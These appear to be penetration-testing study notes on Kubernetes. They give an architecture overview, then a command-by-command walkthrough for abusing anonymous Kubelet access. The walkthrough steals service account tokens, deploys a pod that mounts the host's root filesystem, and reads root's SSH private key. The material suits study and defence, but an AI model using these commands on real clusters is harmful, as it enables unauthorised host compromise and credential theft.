# Kubernetes (K8s) & PrivEsc

## Overview
- Open-source **container orchestration** platform (Google-developed, now under CNCF).
- Automates deployment, scaling, and management of containerized applications.
- Runs containers isolated from the host through multiple protection layers.

### Core Concept: Pods
- A **pod** = one or more tightly-coupled containers, functioning like a mini VM with its own IP/hostname.
- K8s provides load balancing, service discovery, storage orchestration, self-healing.
- Security features: RBAC, Network Policies, Security Contexts.

### Docker vs. Kubernetes

| Function | Docker | Kubernetes |
|---|---|---|
| Primary role | Containerize apps | Orchestrate containers |
| Scaling | Manual (Docker Swarm) | Automatic |
| Networking | Single network | Complex, policy-driven |
| Storage | Volumes | Wide range of storage options |

---

## Architecture

**Control Plane (master node)** — manages the cluster, maintains desired state.

| Component | TCP Port |
|---|---|
| etcd | 2379, 2380 |
| API server | 6443 |
| Scheduler | 10251 |
| Controller Manager | 10252 |
| Kubelet API | 10250 |
| Read-Only Kubelet API | 10255 |

**Worker Nodes (Minions)** — run the actual containerized apps, take instructions from the Control Plane.

- **API server** = entry point for all admin commands (via `kubectl` or controllers); talks to `etcd` to fetch/update cluster state.
- **Scheduler** decides pod placement based on cluster state from the API server.

### Security Domains
1. Cluster infrastructure security
2. Cluster configuration security
3. Application security
4. Data security

### API Basics
- Declarative control — define desired state, K8s enforces it.
- `kube-apiserver` hosts the API, handles RESTful requests.

| Verb | Description |
|---|---|
| GET | Retrieve resource(s) |
| POST | Create resource |
| PUT | Update resource |
| PATCH | Partial update |
| DELETE | Remove resource |

**Auth methods:** client certificates, bearer tokens, authenticating proxy, HTTP basic auth → then **RBAC** for authorization.

⚠️ **Kubelet allows anonymous access by default** — unauthenticated requests can reach the Kubelet API if reachable, exposing sensitive data/actions.

---

## Exploitation Walkthrough

### 1. Probe the API Server
```bash
curl https://<target_ip>:6443 -k
```
- Unauthenticated (`system:anonymous`) requests to root path are normally denied (403 Forbidden) — but worth checking for misconfig.

### 2. Query the Kubelet API for Pods (often unauthenticated!)
```bash
curl https://<target_ip>:10250/pods -k | jq .
```
- Reveals pod names, namespaces, container images, and **last-applied-configuration** — can leak secrets/passwords/API tokens used at deployment.
- Image/version info helps identify known CVEs to target.

### 3. Enumerate with `kubeletctl`
```bash
kubeletctl -i --server <target_ip> pods
```

**Scan for RCE-vulnerable pods:**
```bash
kubeletctl -i --server <target_ip> scan rce
```

**Execute commands inside a pod/container:**
```bash
kubeletctl -i --server <target_ip> exec "id" -p nginx -c nginx
```
- If output shows `uid=0(root)`, the container is running as root → strong privesc potential.

### 4. Extract Service Account Token & CA Cert
```bash
kubeletctl -i --server <target_ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

kubeletctl --server <target_ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

### 5. Check Effective Permissions
```bash
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://<target_ip>:6443 auth can-i --list
```
- Look for ability to `get`/`create`/`list` **pods** — this is the key to further escalation.

### 6. Create a Privileged Pod (Host Root Mount)
If pod creation is permitted, define a pod that mounts the host's `/` into the container:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

**Deploy it:**
```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://<target_ip>:6443 apply -f privesc.yaml
kubectl --token=$token --certificate-authority=ca.crt --server=https://<target_ip>:6443 get pods
```

### 7. Extract Host Secrets via the New Pod
```bash
kubeletctl --server <target_ip> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```
→ Retrieves root's SSH private key from the **host system**, achievable entirely through the Kubelet/API without ever touching the host shell directly.

---

## Key Takeaway
Misconfigured Kubelet anonymous access + permissive RBAC (`create`/`get pods`) is a direct path to full host compromise: enumerate pods → grab service account token/cert → check permissions → deploy a pod with `hostPath: /` mounted → exfiltrate host secrets (e.g. root's SSH key).